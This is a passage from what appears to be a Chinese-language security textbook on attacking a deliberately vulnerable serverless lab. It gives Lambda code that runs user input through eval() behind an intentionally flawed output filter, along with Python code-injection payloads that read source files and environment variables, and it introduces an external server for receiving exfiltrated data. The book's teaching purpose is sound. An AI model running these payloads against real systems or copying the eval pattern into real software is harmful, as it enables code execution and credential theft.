

*   [“使用有限代码注入防护更新 Lambda 函数”](#ch06.html#updating_the_lambda_function_with_limited_code_injection_safeguards_ch06-hacking-publicly-accessible-lambda-functions_1762888681524)

*   [“设置接收外泄数据的服务器”](#ch06.html#setting_up_the_server_that_receives_exfiltrated_data_ch06-hacking-publicly-accessible-lambda-functions_1762888695686)

*   [“攻击易受攻击的无服务器 Web 应用程序”](#ch06.html#attacking_the_vulnerable_serverless_web_application_ch06-hacking-publicly-accessible-lambda-functions_1762888714398)

让我们继续更新你的易受攻击的无服务器实验环境设置。

## 更新具有有限代码注入防护的 Lambda 函数

在本节中，你将使用 `sanitize_output()` 函数更新现有的 Lambda 函数代码，以增加一层防御代码注入攻击的保护。虽然此新函数并非万无一失，但它会在输出返回之前过滤掉非数字字符，从而限制恶意代码执行的风险和影响。

### Note

本节假定你正在使用 Serverless Lab 账户，该账户托管易受攻击的无服务器实验环境。

让我们通过更新 Lambda 函数代码继续操作：

1. 切回已打开 Serverless Lab AWS 账户的浏览器标签页。继续下一步之前，请确保已打开 `lambda-0010` 的 AWS Lambda 函数详情页面。

2. 找到“Code source”部分，然后用以下代码替换现有的 `lambda_function.py` 代码：

```
import re

from os import environ
get_env = environ.get

HARDCODED_KEY_01 = "ABCDE"
HARDCODED_KEY_02 = "FGHIJ"


def get_statement(event):
    params = event.get('queryStringParameters', {})
    statement = params.get('statement', None)

    return statement


def process_statement(statement):
    output = "No statement parameter value provided"

    if statement:
        output = eval(statement)

    return output


def sanitize_output(output):
    return re.sub(r'[^-0-9\.]', '', str(output))


def lambda_handler(event, context):
    print("event: ", event)
    print("HARDCODED_KEY_01: ", HARDCODED_KEY_01)
    print("HARDCODED_KEY_02: ", HARDCODED_KEY_02)
    print("CUSTOM_ENV_VAR_01: ", get_env('CUSTOM_ENV_VAR_01'))
    print("CUSTOM_ENV_VAR_02: ", get_env('CUSTOM_ENV_VAR_02'))

    statement = get_statement(event)
    result = process_statement(statement)

    return {
        'statusCode': 200,
        'body': sanitize_output(result)
    }
```

此 `sanitize_output()` 函数会剥离评估结果中所有非数字或点号的字符。这可确保只有经过清理的数值输出会被发送回用户。

### Caution

实现的 `sanitize_output()` 函数是有意设计为存在缺陷的，仅用于演示目的。它仅移除非数字字符，但在清理步骤之前，`eval()` 函数仍可执行恶意表达式。

3. 修改完 `lambda_function.py` 后，点击 Deploy。你应收到通知 `Successfully updated the function lambda-0010`。

4. 要测试刚部署的 Lambda 函数，请点击 Test。你应看到以下响应：

```
Status: Succeeded
Test Event Name: event-0010

Response:
{
  "statusCode": 200,
  "body": "2"
}

Function Logs:
START RequestId: ... Version: $LATEST
event: {'queryStringParameters': {'statement': '1 + 1'}}
HARDCODED_KEY_01:  ABCDE
HARDCODED_KEY_02:  FGHIJ
CUSTOM_ENV_VAR_01:  KLMNO
CUSTOM_ENV_VAR_02:  PQRST
END RequestId: ...
REPORT RequestId: ...   Duration: 20.50 ms  Billed Duration: 21 ms
Memory Size: 128 MB Max Memory Used: 35 MB  Init Duration: 89.30 ms
```

5. 切到已打开 S3 托管网站的浏览器标签页。然后输入并计算以下表达式：

```
1 + 2 + 3 / 4
```

这会产生以下输出：

```
3.75
```

### Tip

为确保更新后的 Lambda 代码按预期工作，你可以随意测试其他场景，例如 `(1 * 2) / 5` 和 `5 - 42`。

6. 让我们检查应用程序对以下输入的响应方式：

```
__import__('subprocess').check_output('ls', shell=True)
```

这会返回以下响应：

```
.
```

这里仅返回一个点 `.`，因为 `sanitize_output()` 函数在 `eval()` 函数执行表达式后过滤掉了所有其他字符。

7. 检查你是否仍能通过以下表达式检索源代码：

```
__import__('subprocess').check_output('cat *.py', shell=True)
```

以下是输出：

```
.0102...-0-9.0101020201010202200---------
```

同样，输出被剥离为点和数字的混合体（以及负号），因为 `sanitize_output()` 过滤掉了所有其他字符。

8. 让我们验证你是否能够检索环境变量：

```
__import__('subprocess').check_output('env', shell=True)
```

你应得到以下响应：

```
1-68859515-3978245150425469445213380001635003.13--120250726897265143959964--1..-801020695332-0010169.254.100.19001128169.254.100.1169.254.100.120000562276464.-8-0010-322357658187119782506095156401005074936293558585764898474881046818836747799591606034728881849831108942369153722321016774420488178155749911041812000
```

由于新的 `sanitize_output()` 函数已就位，你的 Lambda 函数*似乎*已受到代码注入攻击的保护。然而，正如你在以下各节中将看到的那样，Lambda 函数的出站网络访问使攻击者能够将敏感数据（例如环境变量和源代码）发送到外部服务器。

## 设置接收外泄数据的服务器

在上一节中，你为易受攻击的无服务器 Web 应用程序更新了 Lambda 函数，并添加了 `sanitize_output()` 函数，在将结果发送回前端之前剥离所有非数字字符。从攻击者的角度来看，此更改阻止了他们通过浏览器直接检索外泄数据，但底层漏洞仍然存在。攻击者仍可修改代码注入有效载荷，将外泄数据发送到其控制下的外部服务器，如 [Figure 6-6](#ch06.html#sending-exfiltrated-data-to-an-external-server) 所示。

![](assets/lsse_0606.png)

此外部服务器可以是基于云的虚拟机，例如 EC2 实例，或任何其他运行配置为接收外泄数据的 Web 服务器的主机。一旦此服务器准备就绪，攻击者就可以调整其有效载荷，直接将外泄数据（包括凭据和环境变量）发送到该服务器。然后，他们可以通过检查 Web 服务器的访问日志或有效载荷写入的任何存储来检索外泄的值。请记住，当 Lambda 函数具有不受限制的出站访问权限时，这种方法是可行的。例如，当它未关联到 VPC 时就会发生这种情况，因为未附加到 VPC 的函数默认通过 AWS 管理网络进行互联网出站。如果 Lambda 函数放置在 VPC 内，其出站连接性由 VPC 配置决定，包括子网路由、NAT 或互联网网关的存在，以及安全组或网络访问控制列表中定义的出站规则。
